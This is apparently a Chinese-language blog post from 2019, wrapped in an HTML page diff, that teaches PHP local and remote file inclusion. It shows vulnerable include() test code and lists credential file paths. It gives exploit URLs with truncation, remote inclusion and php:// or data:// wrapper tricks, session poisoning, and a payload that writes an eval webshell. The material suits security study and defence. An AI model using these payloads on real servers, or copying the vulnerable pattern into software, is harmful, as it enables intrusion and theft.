@@ -1,0 +1,1332 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>文件包含漏洞及利用方式 - 明月归的小站</title>
+  
+    <meta name="keywords" content="web,文件包含">
+  
+
+  
+    <meta name="description" content="本篇博客主要介绍了文件包含漏洞及利用方式！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">文件包含漏洞及利用方式</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2019/09/20/file-contant-leak/">
+      文件包含漏洞及利用方式
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2019年9月20日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要介绍了文件包含漏洞及利用方式！</p>
+<a id="more"></a>
+<h2 id="有关包含的函数"><a href="#有关包含的函数" class="headerlink" title="有关包含的函数"></a>有关包含的函数</h2><p>PHP中文件包含函数有以下四种：</p>
+<ol>
+<li>include()</li>
+<li>include_once()</li>
+<li>require()</li>
+<li>require_once()</li>
+</ol>
+<p>include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<p>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<h2 id="本地包含LFI-Local-File-Inclusion"><a href="#本地包含LFI-Local-File-Inclusion" class="headerlink" title="本地包含LFI(Local File Inclusion)"></a>本地包含LFI(Local File Inclusion)</h2><h3 id="无限制本地文件包含漏洞"><a href="#无限制本地文件包含漏洞" class="headerlink" title="无限制本地文件包含漏洞"></a>无限制本地文件包含漏洞</h3><p><strong>测试代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/20/file-contant-leak/1535362888_5b83c7486a92c.png"></p>
+<p>通过目录遍历漏洞可以获取到系统中其他文件的内容：</p>
+<p>常见的敏感信息路径：</p>
+<p><strong>Windows系统</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini &#x2F;&#x2F; 查看系统版本</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码</span><br><span class="line"></span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php 配置信息</span><br></pre></td></tr></table></figure>
+
+<p><strong>Linux/Unix系统</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h3><p>利用条件：<strong>session的存储位置可以获取</strong></p>
+<ol>
+<li>通过phpinfo的信息可以获取到session的存储位置。<br>通过phpinfo的信息，获取到session.save_path为<code>/var/lib/php/session</code>：</li>
+</ol>
+<p>获取到session的存储位置</p>
+<p><img src="/2019/09/20/file-contant-leak/1535366976_5b83d740d5e48.png"></p>
+<ol start="2">
+<li>通过猜测默认的session存放位置进行尝试。<br>如linux下默认存储在<code>/var/lib/php/session</code>目录下：</li>
+</ol>
+<p><img src="/2019/09/20/file-contant-leak/1535366988_5b83d74c81ff5.png"></p>
+<p><strong>session中的内容可以被控制，传入恶意代码</strong>。</p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$ctfs&#x3D;$_GET[&#39;ctfs&#39;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;username&quot;]&#x3D;$ctfs;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>漏洞分析:</strong></p>
+<p>此php会将获取到的GET型ctfs变量的值存入到session中。</p>
+<p>当访问<code>http://www.ctfs-wiki/session.php?ctfs=ctfs</code> 后，会在<code>/var/lib/php/session</code>目录下存储session的值。</p>
+<p>session的文件名为<code>sess_+sessionid</code>，sessionid可以通过开发者模式获取。</p>
+<p><img src="/2019/09/20/file-contant-leak/1535366999_5b83d757ab229.png"></p>
+<p>所以session的文件名为<code>sess_akp79gfiedh13ho11i6f3sm6s6</code>。</p>
+<p>到服务器的<code>/var/lib/php/session</code>目录下查看果然存在此文件，内容为：</p>
+<pre><code>username|s:4:&quot;ctfs&quot;;
+
+[root@c21336db44d2 session]# cat sess_akp79gfiedh13ho11i6f3sm6s6
+
+username|s:4:&quot;ctfs&quot;</code></pre>
+<p><strong>漏洞利用</strong></p>
+<p>通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。</p>
+<p>当访问<code>http://www.ctfs-wiki/session.php?ctfs=&lt;?php phpinfo();?&gt;</code>后，会在<code>/var/lib/php/session</code>目录下存储session的值</p>
+<pre><code>[root@6da845537b27 session]# cat sess_83317220159fc31cd7023422f64bea1a
+
+username|s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;</code></pre>
+<p>攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。</p>
+<h3 id="有限制本地文件包含漏洞绕过"><a href="#有限制本地文件包含漏洞绕过" class="headerlink" title="有限制本地文件包含漏洞绕过"></a>有限制本地文件包含漏洞绕过</h3><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p><strong>条件：</strong><code>magic_quotes_gpc = Off php版本&lt;5.3.4</code></p>
+<p><strong>测试代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<pre><code>http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00</code></pre>
+<p><img src="/2019/09/20/file-contant-leak/1535362913_5b83c7614d63c.png"></p>
+<h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><p><strong>条件：</strong>windows OS，点号需要长于256；linux OS 长于4096</p>
+<pre><code>Windows下目录最大长度为256字节，超出的部分会被丢弃；
+
+Linux下目录最大长度为4096字节，超出的部分会被丢弃。</code></pre>
+<p><strong>测试代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>EXP:</strong></p>
+<pre><code>http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></pre>
+<p><img src="/2019/09/20/file-contant-leak/1535362924_5b83c76c8b50a.png"></p>
+<h4 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h4><p><code>条件：</code>windows OS，点号需要长于256</p>
+<pre><code>测试代码：</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>EXP:</strong></p>
+<pre><code>http://www.ctfs-wiki.com/FI/FI.php？filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</code></pre>
+<p><img src="/2019/09/20/file-contant-leak/1535361836_5b83c32c4668a.png"></p>
+<h2 id="远程包含RFI-Remote-File-Inclusion"><a href="#远程包含RFI-Remote-File-Inclusion" class="headerlink" title="远程包含RFI(Remote File Inclusion)"></a>远程包含RFI(Remote File Inclusion)</h2><p>PHP的配置文件<code>allow_url_fopen</code>和<code>allow_url_include</code>设置为ON，<code>include/require</code>等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
+<pre><code>allow_url_fopen = On（是否允许打开远程文件，PHP&lt;5.2默认打开，）
+
+allow_url_include = On（是否允许include/require远程文件，默认关闭）</code></pre>
+<h3 id="无限制远程文件包含漏洞"><a href="#无限制远程文件包含漏洞" class="headerlink" title="无限制远程文件包含漏洞"></a>无限制远程文件包含漏洞</h3><p><strong>测试代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>通过远程文件包含漏洞，包含php.txt可以解析。</p>
+<pre><code>http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt</code></pre>
+<p><strong>测试结果：</strong><br><img src="/2019/09/20/file-contant-leak/1535361964_5b83c3aceeb21.png"></p>
+<h3 id="有限制远程文件包含漏洞绕过"><a href="#有限制远程文件包含漏洞绕过" class="headerlink" title="有限制远程文件包含漏洞绕过"></a>有限制远程文件包含漏洞绕过</h3><p><strong>测试代码：</strong></p>
+<pre><code>&lt;?php include($_GET[&#39;filename&#39;] . &quot;.html&quot;); ?&gt;</code></pre>
+<p>代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。</p>
+<p><img src="/2019/09/20/file-contant-leak/1535362030_5b83c3ee6c99b.png"></p>
+<h4 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h4><pre><code>http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?</code></pre>
+<p><img src="/2019/09/20/file-contant-leak/1535362020_5b83c3e4ef0d3.png"></p>
+<h4 id="号绕过"><a href="#号绕过" class="headerlink" title="#号绕过"></a>#号绕过</h4><pre><code>http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23</code></pre>
+<p><img src="/2019/09/20/file-contant-leak/1535362014_5b83c3de83a8c.png"></p>
+<p>还有哪些可以绕过？用burp跑一遍发现空格也可以绕过：</p>
+<p><img src="/2019/09/20/file-contant-leak/1535362006_5b83c3d6c0463.png"></p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 <code>fopen()</code>、 <code>copy()</code>、 <code>file_exists()</code> 和 <code>filesize()</code> 的文件系统函数。 除了这些封装协议，还能通过 <code>stream_wrapper_register()</code>来注册自定义的封装协议。</p>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p><img src="/2019/09/20/file-contant-leak/1535362079_5b83c41fbe910.png"></p>
+<h3 id="php-输入输出流"><a href="#php-输入输出流" class="headerlink" title="php:// 输入输出流"></a>php:// 输入输出流</h3><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<h3 id="php-filter（本地磁盘文件进行读取）"><a href="#php-filter（本地磁盘文件进行读取）" class="headerlink" title="php://filter（本地磁盘文件进行读取）"></a>php://filter（本地磁盘文件进行读取）</h3><p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p>
+<p><strong>用法：</strong></p>
+<pre><code>?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php 一样。</code></pre>
+<p><strong>条件：</strong>只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p>
+<p><img src="/2019/09/20/file-contant-leak/1535362099_5b83c4338ee40.png"></p>
+<p><strong>测试代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input是无效的。</p>
+<p><strong>用法：</strong></p>
+<pre><code>?file=php://input 数据利用POST传过去。</code></pre>
+<h3 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h3><p>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p><strong>测试代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<p><img src="/2019/09/20/file-contant-leak/1535362131_5b83c453589ad.png"></p>
+<h3 id="php-input（写入木马）"><a href="#php-input（写入木马）" class="headerlink" title="php://input（写入木马）"></a>php://input（写入木马）</h3><p><strong>测试代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>条件：</strong>php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。</p>
+<p>如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。</p>
+<pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre>
+<p><img src="/2019/09/20/file-contant-leak/1535362139_5b83c45b1a703.png"></p>
+<p><strong>测试结果：</strong></p>
+<p><img src="/2019/09/20/file-contant-leak/1535362160_5b83c470ae2c9.png"></p>
+<p>如果不开启allow_url_include会报错：</p>
+<p><img src="/2019/09/20/file-contant-leak/1535362176_5b83c48090fd4.png"></p>
+<h3 id="php-input（命令执行）"><a href="#php-input（命令执行）" class="headerlink" title="php://input（命令执行）"></a>php://input（命令执行）</h3><p><strong>测试代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>条件：</strong>php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p>
+<p><img src="/2019/09/20/file-contant-leak/1535362228_5b83c4b420691.png"></p>
+<p>如果不开启allow_url_include会报错：</p>
+<p><img src="/2019/09/20/file-contant-leak/1535362242_5b83c4c2bbbc9.png"></p>
+<h3 id="file-伪协议-（读取文件内容）"><a href="#file-伪协议-（读取文件内容）" class="headerlink" title="file://伪协议 （读取文件内容）"></a>file://伪协议 （读取文件内容）</h3><p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
+<p><strong>测试代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/20/file-contant-leak/1535362266_5b83c4daaa35c.png"></p>
+<h3 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h3><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；</p>
+<pre><code>data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4
+
+data://（读取文件）</code></pre>
+<p>和php伪协议的input类似，碰到file_get_contents()来用；</p>
+<pre><code>&lt;?php // 打印 “I love PHP” echo file_get_contents(‘data://textplain;base64,SSBsb3ZlIFBIUAo=’); ?&gt;
+
+注意：&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,这类执行代码最后没有?&gt;&lt;/span&gt;闭合;</code></pre>
+<p>如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/20/file-contant-leak/1535362287_5b83c4efe99a7.png"></p>
